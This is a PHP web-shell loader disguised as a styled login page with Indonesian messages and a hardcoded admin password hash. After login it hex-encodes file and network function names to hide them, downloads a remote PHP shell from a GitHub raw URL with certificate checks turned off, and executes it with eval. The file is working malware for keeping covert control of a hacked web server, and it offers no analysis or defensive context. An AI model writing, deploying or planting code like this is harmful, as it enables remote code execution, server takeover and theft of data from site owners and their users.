<?php
session_start();

function is_logged_in() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

$username = "admin";
$passwordHash = '$2a$12$rdWBHc1j2UwdQypjBPcNV.gcEUhw6S8vOY/MtcQvSH7kcL2rtEcdm';

if (!is_logged_in()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if ($_POST['username'] === $username && password_verify($_POST['password'], $passwordHash)) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Username atau password salah. Silakan coba lagi.";
        }
    }
}

function hex2str($hex) {
    $str = '';
    for ($i = 0; $i < strlen($hex); $i += 2) {
        $str .= chr(hexdec(substr($hex, $i, 2)));
    }
    return $str;
}

function geturlsinfo($destiny) {
    $Array = array(
        '666f70656e',
        '73747265616d5f6765745f636f6e74656e7473',
        '66696c655f6765745f636f6e74656e7473',
        '6375726c5f65786563'
    );

    $belief = array(
        hex2str($Array[0]),
        hex2str($Array[1]),
        hex2str($Array[2]),
        hex2str($Array[3])
    );

    if (function_exists($belief[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $love = $belief[3]($ch);
        curl_close($ch);
        return $love;
    } elseif (function_exists($belief[2])) {
        return $belief[2]($destiny);
    } elseif (function_exists($belief[0]) && function_exists($belief[1])) {
        $purpose = $belief[0]($destiny, "r");
        $love = $belief[1]($purpose);
        fclose($purpose);
        return $love;
    }
    return false;
}

if (is_logged_in()) {
    $destiny = 'https://raw.githubusercontent.com/pemudahijrah1337/shell/refs/heads/main/pemuda.php';
    $dream = geturlsinfo($destiny);

    if ($dream !== false) {
        eval('?>' . $dream);
        exit();
    }
}

if (!is_logged_in()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Login Form</title>
        <style>
            body, html {
                margin: 0;
                padding: 0;
                height: 100%;
                display: flex;
                justify-content: center;
                align-items: center;
                background-color: #220022;
                font-family: Arial, sans-serif;
            }
            .form-container {
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100%;
            }
            .login-form {
                width: 300px;
                padding: 20px;
                background-color: #3d003d;
                border-radius: 8px;
                box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.2);
                text-align: center;
                color: white;
            }
            .login-form img {
                width: 80px;
                margin-bottom: 10px;
            }
            .login-form h2 {
                margin: 0;
                padding: 10px 0;
                font-size: 20px;
            }
            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                border: none;
                border-radius: 4px;
                box-sizing: border-box;
                font-size: 16px;
            }
            .login-form button {
                width: 100%;
                padding: 10px;
                background-color: #ff0055;
                color: white;
                border: none;
                border-radius: 4px;
                cursor: pointer;
                font-size: 16px;
            }
            .login-form button:hover {
                background-color: #e6004c;
            }
            .login-form .options {
                margin-top: 10px;
                font-size: 14px;
                color: #d1d1d1;
            }
            .login-form .options a {
                color: #ff0055;
                text-decoration: none;
            }
            .login-form .options a:hover {
                text-decoration: underline;
            }
            .error-message {
                color: red;
                font-size: 14px;
                margin-top: 10px;
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://i.pinimg.com/564x/6e/a8/02/6ea802b32f53cda0bf7542059d174481.jpg" alt="Logo">
                <h2>Login Form</h2>
                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <input type="text" name="username" placeholder="Username ..." required>
                    <input type="password" name="password" placeholder="Password ..." required>
                    <button type="submit">Sign in</button>
                </form>
                <div class="options">
                    <label><input type="checkbox"> Remember Me</label>
                    <br>
                    <a href="#">Create Account</a> | <a href="#">Forget Password?</a>
                </div>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}
?>